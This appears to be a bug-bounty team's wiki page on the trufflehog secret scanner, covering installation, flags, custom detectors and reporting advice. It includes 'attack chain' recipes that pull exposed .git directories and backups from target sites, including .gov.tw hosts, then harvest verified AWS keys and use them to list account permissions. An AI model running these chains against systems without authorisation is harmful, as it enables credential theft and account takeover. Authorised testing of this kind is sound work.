---
type: wiki
category: tool
tool: trufflehog
status: active
last-updated: 2026-04-21
source: https://github.com/trufflesecurity/trufflehog
---

# Tool: trufflehog (Secret scanner)

> **Purpose:** Scans git history / filesystem / S3 / Docker images for **high-confidence secrets** (API keys, tokens, credentials).
> Core advantage: **verifies whether a secret is active** (actually tries the key against AWS / GitHub / Slack APIs).

## Installation

```bash
# Homebrew
brew install trufflehog

# Docker
docker run -it trufflesecurity/trufflehog github --repo https://github.com/repo

# Native
curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin
```

## Basic usage

```bash
# Git repo (local)
trufflehog git file:///path/to/repo --only-verified

# GitHub repo
trufflehog github --repo https://github.com/org/repo --only-verified

# Scan after recovering from a leaked .git
git-dumper https://target/.git/ ./dump
trufflehog git file://./dump --only-verified

# Filesystem
trufflehog filesystem --directory ./source_code --only-verified

# S3 bucket
trufflehog s3 --bucket=my-bucket --only-verified

# Docker image
trufflehog docker --image=nginx:latest --only-verified
```

## Essential flags

| Flag | Purpose |
|------|------|
| `--only-verified` | **Key flag** — only report active secrets (trufflehog will test them) |
| `--json` | JSON output |
| `--no-update` | Don't auto-update |
| `--concurrency 10` | Parallelism |
| `--include-detectors 'aws,gcp,slack'` | Only scan with specific detectors |
| `--exclude-detectors 'generic'` | Exclude a detector |
| `--since-commit abc123` | Only scan after a given commit |
| `--branch main` | Only scan a specific branch |
| `--config trufflehog.yaml` | Custom rules |
| `--no-verification` | Skip verification (much faster, higher false-positive rate) |

## Recommended combinations

### Scan a recovered .git leak

```bash
# 1. Recover .git
git-dumper https://target.gov.tw/.git/ ./dump

# 2. Scan the full git history
trufflehog git file://./dump \
  --only-verified \
  --json \
  --concurrency 10 > secrets.json

# 3. Read human-readable output
trufflehog git file://./dump --only-verified
```

### Scan a GitHub organization

```bash
export GITHUB_TOKEN="ghp_xxx"

# Entire org, all repos
trufflehog github --org=targetorg --only-verified

# Single repo, including all branches
trufflehog github --repo=https://github.com/org/repo --branch=all --only-verified

# Scan a specific user's repos
trufflehog github --user=targetuser --only-verified
```

### Scan an extracted backup.zip

```bash
# 1. Download + extract (see wiki 12)
curl -O https://target.gov.tw/backup.zip
unzip backup.zip -d ./backup

# 2. Scan the whole directory
trufflehog filesystem --directory=./backup --only-verified
```

### Scan a Docker image (Jenkins/Harbor)

```bash
# Scan a public Harbor image
trufflehog docker --image=public.harbor.example.com/ops/prod-backup:latest --only-verified

# Scan Docker Hub
trufflehog docker --image=username/private-image:tag --only-verified
```

### Scan a misconfigured S3 bucket

```bash
# Anonymous mode
trufflehog s3 --bucket=my-public-bucket --only-verified

# With AWS creds
AWS_ACCESS_KEY_ID=xxx AWS_SECRET_ACCESS_KEY=yyy \
  trufflehog s3 --bucket=my-bucket --only-verified
```

## Sample output

```
✅ Found verified result

Detector Type: AWS
Decoder Type: PLAIN
Raw Result: AKIAIOSFODNN7EXAMPLE
Raw Verification: https://sts.amazonaws.com (200 OK)
File: /dump/config/aws_prod.yml
Line: 42
Commit: abc123def
Verified: true
Account: 123456789012
```

`Verified: true` → this key **actually still works**.

## Detector support (partial)

trufflehog has 700+ built-in detectors, spanning:

- Cloud: AWS / GCP / Azure / Alibaba / DigitalOcean / Cloudflare
- VCS: GitHub / GitLab / Bitbucket / Gitea
- DB: MongoDB / MySQL / PostgreSQL / Redis connection strings
- Messaging: Slack / Discord / Teams / Telegram
- API: Stripe / Twilio / SendGrid / Mailgun / Paypal
- Crypto: Private keys / JWT secrets

## Attack chain examples

### Chain A: .git → trufflehog → AWS takeover

```bash
# 1. config-leak found a .git
# 2. Recover it
git-dumper https://target.gov.tw/.git/ ./dump

# 3. Scan history
trufflehog git file://./dump --only-verified --json > secrets.json

# 4. Find AWS key
jq 'select(.DetectorName == "AWS")' secrets.json

# 5. If Verified=true → confirm permissions with aws sts get-caller-identity
export AWS_ACCESS_KEY_ID=$(jq -r '.Raw' secrets.json | head -1)
export AWS_SECRET_ACCESS_KEY=$(jq -r '.RawV2' secrets.json | head -1)
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d/ -f2)
```

### Chain B: Docker image → trufflehog → hard-coded creds

```bash
# 1. Pull image from Harbor / ACR
docker pull targetharbor.example.com/prod/api:latest

# 2. Scan
trufflehog docker --image=targetharbor.example.com/prod/api:latest --only-verified
```

### Chain C: backup.zip → trufflehog

```bash
# 1. backup-files hunter found backup.zip
# 2. Download and extract
curl -O https://target/backup.zip && unzip backup.zip -d ./backup

# 3. Scan
trufflehog filesystem --directory=./backup --only-verified
```

## Custom detectors

`trufflehog.yaml`:

```yaml
detectors:
  - name: CompanyInternalAPIKey
    keywords:
      - "COMP_API_"
    regex:
      key: "COMP_API_[A-Z0-9]{32}"
    verify:
      - endpoint: "https://internal.company.com/api/v1/verify"
        unsafe: false
        headers:
          - 'Authorization: Bearer {raw}'
        successRanges:
          - 200-299
```

## Noise-reduction tips

### 1. Only look at Verified

```bash
# trufflehog reports unverified by default; add --only-verified to see only truly-active ones
trufflehog git file://./dump --only-verified
```

### 2. Exclude the generic detector

```bash
# the generic detector has the most false positives
trufflehog git file://./dump --exclude-detectors=generic --only-verified
```

### 3. Restrict to specific detectors

```bash
# only scan high-confidence categories
trufflehog git file://./dump \
  --include-detectors='aws,gcp,azure,github,slack,stripe,twilio' \
  --only-verified
```

## bbflow integration

```bash
# hunt-trufflehog-secrets hunter
bbflow hunt target --only trufflehog
```

## Reporting recommendations

- **Verified: true** → P1 (active secret)
- **Verified: false** → P3-P4 (possibly a rotated key, but still a leak)
- Attach commit hash + file path + which detector hit
- **Never** include the full secret in a report — only the first 4 and last 4 characters

Example:
```markdown
AWS Access Key: AKIA****EXAMPLE
AWS Account: 123456789012 (verified via STS)
Found in: .git commit abc123 → config/aws_prod.yml:42
IAM Permissions: read-only s3 + write logs
```

## Related files

- [28-tool-git-dumper.md](28-tool-git-dumper.md)
- [12-hunter-backup-files.md](12-hunter-backup-files.md)
- [10-hunter-config-leak.md](10-hunter-config-leak.md)
